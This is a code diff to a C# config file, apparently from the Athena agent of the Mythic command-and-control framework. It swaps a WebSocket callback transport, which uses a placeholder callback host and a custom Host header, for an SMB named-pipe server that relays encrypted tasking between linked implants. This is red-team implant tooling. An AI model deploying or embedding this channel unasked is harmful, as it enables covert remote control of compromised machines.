@@ -1,106 +1,109 @@
-﻿using Athena.Utilities;
+﻿using Athena.Models.Mythic.Response;
+using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
-using System.IO;
-using System.Net.WebSockets;
-using System.Text;
-using System.Threading;
+using System.Collections.Concurrent;
 using System.Threading.Tasks;
+using H.Pipes;
+using H.Pipes.Args;
+using System.Threading;
 
 namespace Athena.Config
 {
     public class MythicConfig
     {
-        public Websocket currentConfig { get; set; }
+        public Smb currentConfig { get; set; }
         public string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Forwarder forwarder;
+        public Forwarder forwarder { get; set; }
 
         public MythicConfig()
         {
             this.uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            int jitter = 0;
             this.jitter = jitter;
-            this.currentConfig = new Websocket(this.uuid);
+            this.currentConfig = new Smb(this.uuid, this);
             this.forwarder = new Forwarder();
         }
     }
 
-    public class Websocket
+    public class Smb
     {
         public string psk { get; set; }
-        public string endpoint { get; set; }
-        public string userAgent { get; set; }
-        public string callbackHost { get; set; }
-        public int callbackInterval { get; set; }
-        public int callbackJitter { get; set; }
-        public int callbackPort { get; set; }
-        public string hostHeader { get; set; }
-        public bool encryptedExchangeCheck { get; set; }
-        public ClientWebSocket ws { get; set; }
-        public PSKCrypto crypt { get; set; }
+        private PipeServer<string> serverPipe { get; set; }
+        public string pipeName = "pipename";
+        private bool connected { get; set; }
         public bool encrypted { get; set; }
-        public int connectAttempts { get; set; }
+        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        public PSKCrypto crypt { get; set; }
+        public BlockingCollection<DelegateMessage> queueIn { get; set; }
+        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
+        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
 
-        public Websocket(string uuid)
+        public Smb(string uuid, MythicConfig config)
         {
-            int callbackPort = Int32.Parse("callback_port");
-            string callbackHost = "callback_host";
-            this.endpoint = "ENDPOINT_REPLACE";
-            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "USER_AGENT";
-            this.hostHeader = "%HOSTHEADER%";
+            this.connected = false;
             this.psk = "AESPSK";
-            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
                 this.encrypted = true;
             }
-
-            this.ws = new ClientWebSocket();
-
-            if (!String.IsNullOrEmpty(this.hostHeader))
-            {
-                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
-            }
-
-            Connect(callbackURL);
+            this.serverPipe = new PipeServer<string>(this.pipeName);
+            this.serverPipe.ClientConnected += (o, args) => OnClientConnection();
+            this.serverPipe.ClientDisconnected += (o, args) => OnClientDisconnect();
+            this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
+            this.serverPipe.StartAsync();
         }
 
-        public bool Connect(string url)
+        private async void OnMessageReceive(ConnectionMessageEventArgs<string> args)
         {
-            this.connectAttempts = 0;
             try
             {
-                ws = new ClientWebSocket();
-                ws.ConnectAsync(new Uri(url), CancellationToken.None);
-
-                while (ws.State != WebSocketState.Open)
-                {
-                    if (this.connectAttempts == 300)
-                    {
-                        Environment.Exit(0);
-                    }
-                    Thread.Sleep(1000);
-                    this.connectAttempts++;
-                }
-                return true;
+                //Add message to out queue.
+                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
+                this.queueIn.Add(dm);
             }
             catch
             {
-                return false;
+                DelegateMessage dm = new DelegateMessage()
+                {
+                    c2_profile = "smb",
+                    uuid = "",
+                    message = ""
+                };
             }
+            onEventHappenedSignal.Set(); //Indicate something happened
         }
 
+        public async void OnClientConnection()
+        {
+            onClientConnectedSignal.Set();
+            this.connected = true;
+        }
+
+        public async void OnClientDisconnect()
+        {
+            this.connected = false;
+            onEventHappenedSignal.Set(); //Indicate something happened
+            onClientConnectedSignal.Reset();
+        }
+
+        //Send, wait for a response, and return it to the main functions
         public async Task<string> Send(object obj)
         {
+            if (!connected) 
+            {
+                onClientConnectedSignal.WaitOne();
+            }
+
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
@@ -113,77 +116,53 @@ namespace Athena.Config
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
-                WebSocketMessage m = new WebSocketMessage()
+                //Submit our message to the mythic server and wait for a response
+                DelegateMessage dm = new DelegateMessage()
                 {
-                    Client = true,
-                    Data = json,
-                    Tag = ""
+                    uuid = Globals.mc.MythicConfig.uuid,
+                    message = json,
+                    c2_profile = "smb"
                 };
 
-                string message = JsonConvert.SerializeObject(m);
-                byte[] msg = Encoding.UTF8.GetBytes(message);
-                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
-                message = await Receive(ws);
+                await this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm)); //Write our output
 
-                if (String.IsNullOrEmpty(message))
+                //Wait for a signal
+
+                onEventHappenedSignal.WaitOne();
+
+                if (!connected) //Our event was a client disconnect
                 {
+                    onEventHappenedSignal.Reset(); //Reset the event and return empty
                     return "";
                 }
-
-                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
-
-                if (this.encrypted)
+                else //Our event was a new message
                 {
-                    return this.crypt.Decrypt(m.Data);
-                }
-                else
-                {
-                    return Misc.Base64Decode(m.Data).Substring(36);
-                }
-            }
-            catch
-            {
-                return "";
-            }
-        }
-        static async Task<string> Receive(ClientWebSocket socket)
-        {
-            try
-            {
-                var buffer = new ArraySegment<byte>(new byte[2048]);
-                do
-                {
-                    WebSocketReceiveResult result;
-                    using (var ms = new MemoryStream())
+                    if (this.queueIn.Count > 0) //Check if we actually got a message
                     {
-                        do
+                        dm = this.queueIn.Take(); //Take a value from it
+
+                        onEventHappenedSignal.Reset(); //Reset the event and return
+
+                        if (this.encrypted) //Return dm
                         {
-                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
-                            ms.Write(buffer.Array, buffer.Offset, result.Count);
-                        } while (!result.EndOfMessage);
-
-                        if (result.MessageType == WebSocketMessageType.Close)
-                            break;
-
-                        ms.Seek(0, SeekOrigin.Begin);
-                        using (var reader = new StreamReader(ms, Encoding.UTF8))
-                            return (await reader.ReadToEndAsync());
+                            return this.crypt.Decrypt(dm.message);
+                        }
+                        else
+                        {
+                            return Misc.Base64Decode(dm.message).Substring(36);
+                        }
                     }
-
-                } while (true);
-
-                return "";
+                    else
+                    {
+                        return "";
+                    }
+                }
             }
             catch
             {
+                this.connected = false;
                 return "";
             }
-        }
-        private class WebSocketMessage
-        {
-            public bool Client { get; set; }
-            public string Data { get; set; }
-            public string Tag { get; set; }
         }
     }
 }
